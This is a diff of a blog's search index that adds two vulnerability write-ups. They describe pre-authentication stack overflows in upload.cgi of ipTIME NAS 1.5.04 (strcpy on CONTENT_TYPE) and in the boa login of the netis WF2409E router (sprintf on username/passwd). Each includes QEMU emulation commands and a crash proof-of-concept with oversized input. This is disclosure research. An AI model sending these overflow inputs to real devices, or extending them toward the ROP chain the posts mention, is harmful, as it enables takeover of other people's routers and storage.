@@ -4,6 +4,44 @@
   
   
   <entry>
+    <title>Buffer Overflow in upload.cgi of iptime_nas_1.5.04</title>
+    <link href="/2025/04/25/Buffer-Overflow-in-upload-cgi-of-iptime-nas-1-5-04/"/>
+    <url>/2025/04/25/Buffer-Overflow-in-upload-cgi-of-iptime-nas-1-5-04/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Buffer-Overflow-in-upload-cgi-of-iptime-nas-1-5-04"><a href="#Buffer-Overflow-in-upload-cgi-of-iptime-nas-1-5-04" class="headerlink" title="Buffer Overflow in upload.cgi of iptime_nas_1.5.04"></a>Buffer Overflow in upload.cgi of iptime_nas_1.5.04</h1><h2 id="The-principle-of-the-vulnerability"><a href="#The-principle-of-the-vulnerability" class="headerlink" title="The principle of the vulnerability"></a>The principle of the vulnerability</h2><p>It can be observed that the vulnerability is caused by strcpy. Since the authentication logic is executed after the strcpy operation, this constitutes a <strong>pre-authentication vulnerability</strong>.</p><p><img src="/../res/image-20250425112559057.png" alt="image-20250425112559057"></p><p><img src="/../res/image-20250425112609126.png" alt="image-20250425112609126"></p><h2 id="Use-QEMU-for-simulation"><a href="#Use-QEMU-for-simulation" class="headerlink" title="Use QEMU for simulation"></a>Use QEMU for simulation</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">command</span> = f&#x27;sudo chroot . <span class="hljs-string">./qemu-arm-static</span> -L <span class="hljs-string">./lib</span> -g 1234 <span class="hljs-string">./usr/webroot/upload.cgi</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> <span class="hljs-type">os</span><br><br><br><span class="hljs-variable">count_ones</span> <span class="hljs-operator">=</span> <span class="hljs-number">5000</span><br>content_type_value = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-type">count_ones</span><br><br><br><span class="hljs-variable">command</span> <span class="hljs-operator">=</span> f<span class="hljs-string">&#x27;sudo chroot . ./qemu-arm-static -L ./lib -g 1234 -E CONTENT_TYPE=&#123;content_type_value&#125; ./usr/webroot/upload.cgi&#x27;</span><br><br><br>os.system(command)<br>    <br></code></pre></td></tr></table></figure><h2 id="The-result-of-the-attack"><a href="#The-result-of-the-attack" class="headerlink" title="The result of the attack."></a>The result of the attack.</h2><p>It can be seen that the stack space allocated by V8 is 08h.</p><p><img src="/../res/image-20250425112843647.png" alt="image-20250425112843647"></p><p><img src="/../res/409f26874d89240514a94b25cce067c2.png" alt="409f26874d89240514a94b25cce067c2"></p><p><img src="/../res/505bded03ba362093859cf7293904187.png" alt="505bded03ba362093859cf7293904187"></p><p><img src="/../res/7ddfa109889f3cb0ce68b3c4388b4a2c.png" alt="7ddfa109889f3cb0ce68b3c4388b4a2c"></p><p>Eventually, the overflow reaches 0xd0, and the execution flow of the program is controlled. If necessary, more overflow can be achieved.</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Buffer Overflow in boa of netis_WF2409E</title>
+    <link href="/2025/04/25/Buffer-Overflow-in-boa-of-netis-WF2409E/"/>
+    <url>/2025/04/25/Buffer-Overflow-in-boa-of-netis-WF2409E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Buffer-Overflow-in-boa-of-netis-WF2409E"><a href="#Buffer-Overflow-in-boa-of-netis-WF2409E" class="headerlink" title="Buffer Overflow in boa of netis_WF2409E"></a>Buffer Overflow in boa of netis_WF2409E</h1><h2 id="Principle-of-Vulnerability"><a href="#Principle-of-Vulnerability" class="headerlink" title="Principle of Vulnerability"></a>Principle of Vulnerability</h2><p>During my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the netis_WF2409E router.</p><p>sub_4110d4 is the authentication logic. It concatenates the username and passwd to v5 and then compares it with sys_passwd. However, since sprintf does not perform length checking, an overflow occurs. Therefore, this is <strong>a vulnerability before authentication.</strong></p><p><img src="/../res/image-20250425142156676.png" alt="image-20250425142156676"></p><h2 id="Simulate-using-QEMU"><a href="#Simulate-using-QEMU" class="headerlink" title="Simulate using QEMU."></a>Simulate using QEMU.</h2><p>Start a web service by simulating BOA with QEMU.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> ./ ./qemu-mips-static  -L ./lib  ./bin/boa -p /web -f /etc/boa.conf<br></code></pre></td></tr></table></figure><p><img src="/../res/65b6a1267ae9f59ca526e2b23a486a52.png" alt="img"></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>Pass parameters</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1111111111111111111111111111111111111111111111111111111</span>&amp;passwd=<span class="hljs-number">11111111111111111111111111111111111111111</span><br></code></pre></td></tr></table></figure><p>It can be observed that the web service has crashed completely.</p><p><img src="/../res/ff4faca66748100cccc85aa36addeb8e.png" alt="ff4faca66748100cccc85aa36addeb8e"></p><h2 id="Debug-using-gdb"><a href="#Debug-using-gdb" class="headerlink" title="Debug using gdb."></a>Debug using gdb.</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> ./ ./qemu-mips-static  -L ./lib   -g 1234 ./bin/boa -p /web -f /etc/boa.conf<br></code></pre></td></tr></table></figure><p><img src="/../res/eb26f09d82a5d9b23d33329823ea002e.png" alt="eb26f09d82a5d9b23d33329823ea002e"></p><p>It can be seen that the program has overflowed and controlled the program execution flow. If necessary, more overflow can be performed to construct a ROP chain.</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>web_sys_infoContact_post_contact</title>
     <link href="/2025/04/20/web-sys-infoContact-post-contact/"/>
     <url>/2025/04/20/web-sys-infoContact-post-contact/</url>
